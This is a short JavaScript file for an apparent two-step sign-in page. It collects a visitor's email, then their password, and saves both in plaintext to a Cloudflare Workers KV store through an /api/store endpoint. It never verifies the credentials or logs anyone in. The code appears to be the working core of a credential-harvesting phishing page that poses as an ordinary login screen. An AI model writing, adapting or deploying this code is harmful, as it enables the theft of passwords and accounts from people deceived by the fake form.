console.log('Script loaded');

// Use the current URL instead of a hardcoded one
const PAGES_URL = window.location.origin;

async function storeCredential(key, value) {
    try {
        const response = await fetch('/api/store', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ key: key, value: value })
        });

        if (!response.ok) {
            const errorData = await response.json();
            console.error(`Error storing credential: ${response.status} - ${JSON.stringify(errorData)}`);
        }
    } catch (error) {
        console.error("An error occurred while storing the credential: " + error.message);
    }
}

// Code for index.html (Handles form submission)
const form = document.getElementById('signin-form');
if (form) {
    form.addEventListener('submit', async function (event) {
        event.preventDefault();
        const emailInput = document.getElementById('email');
        const email = emailInput.value;

        // Store email in Cloudflare Workers KV (key only)
        await storeCredential(email, "");

        window.location.href = `welcome.html?email=${encodeURIComponent(email)}`;
    });
}

// Code for welcome.html (Handles email display and show password)
const urlParams = new URLSearchParams(window.location.search);
const userEmail = urlParams.get('email');
const userEmailElement = document.getElementById('user-email');
if (userEmailElement) {
    userEmailElement.textContent = userEmail;
}

const passwordForm = document.getElementById('password-form');
if (passwordForm) {
    passwordForm.addEventListener('submit', async function (event) {
        event.preventDefault();
        const passwordInput = document.getElementById('password');
        const password = passwordInput.value;

        // Store password in Cloudflare Workers KV (using email as key)
        await storeCredential(userEmail, password);

        // You can add a redirect or any other action here if needed
    });
}

// Show Password functionality
const passwordInput = document.getElementById('password');
const showPasswordCheckbox = document.getElementById('show-password');
if (passwordInput && showPasswordCheckbox) {
    showPasswordCheckbox.addEventListener('change', function () {
        passwordInput.type = this.checked ? 'text' : 'password';
    });
}